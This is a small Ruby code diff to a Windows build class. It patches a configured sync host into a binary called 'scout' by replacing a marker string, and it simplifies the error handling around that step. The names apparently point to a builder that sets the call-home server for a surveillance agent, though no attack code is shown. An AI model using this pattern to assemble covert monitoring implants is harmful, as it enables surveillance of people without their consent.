@@ -41,16 +41,10 @@ class BuildWindows < Build
       # invoke the generic patch method with the new params
       super
       patch_file(:file => 'scout') do |content|
-        begin
-          host = @factory.configs.first.sync_host
-          raise "Sync host not found" unless host
-          marker = "Sync"
-          content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
-          #marker = "Screenshot"
-          #content.binary_patch 'SHOT', host.ljust(4, @factory.configs.first.screenshot_enabled? ? "\x00" : "\x01")
-        rescue
-          raise "#{marker} marker not found"
-        end
+        host = @factory.configs.first.sync_host
+        raise "Sync host not found" unless host
+        content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
+        #content.binary_patch 'SHOT', host.ljust(4, @factory.configs.first.screenshot_enabled? ? "\x00" : "\x01")
       end
     end
 
